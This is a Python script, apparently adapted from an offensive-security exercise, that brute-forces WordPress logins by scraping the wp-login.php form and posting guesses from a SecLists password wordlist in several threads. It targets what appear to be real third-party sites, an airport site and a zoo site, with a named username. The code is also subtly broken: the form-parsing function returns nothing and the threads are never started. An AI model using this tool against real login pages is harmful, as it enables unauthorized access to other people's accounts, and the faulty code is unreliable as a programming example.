from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = 'https://www.brazzaville-aeroport.com/wp-login.php'
WORDLIST = '/home/archuser/tools/SecLists/Passwords/Common-Credentials/best15.txt'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'brute force attack on {url}')
        print(f'finished where username {username}')
    
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, ))
            t.start
    
    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        
        while not passwords.empty():
            time.sleep(5)
            passwd = passwords.get()
            print(f'trying {self.username}:{passwd:<10}')
            params['pwd'] = passwd
            
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print('sucess')
                print(f'{self.username}:{passwd}')
            else:
                print(f'no succes on {passwd}')
                
if __name__ == '__main__':
    words = get_words()
    b = Bruter('msemmelbeck', 'https://www.dallaszoo.com/wp-login.php')
    b.run_bruteforce(words)